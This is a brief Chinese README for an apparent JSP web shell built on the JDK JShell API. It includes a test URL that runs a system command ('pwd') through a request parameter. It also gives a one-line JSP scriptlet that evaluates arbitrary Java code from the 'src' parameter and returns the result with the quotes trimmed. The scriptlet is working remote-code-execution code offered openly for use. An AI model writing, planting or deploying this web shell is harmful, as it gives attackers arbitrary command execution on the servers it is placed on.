readme

[](http://p2j.cn/uploads/image/20190910/20190910185302_297.png)

测试用例：http://localhost:8080/modules/jshell.jsp?src=new%20java.io.BufferedReader(new%20java.io.InputStreamReader(Runtime.getRuntime().exec(%22pwd%22).getInputStream())).readLine()

如果强迫症想撸掉多余的输出：


<%=jdk.jshell.JShell.builder().build().eval(request.getParameter("src")).get(0).value().replaceAll("^\"", "").replaceAll("\"$", "")%>
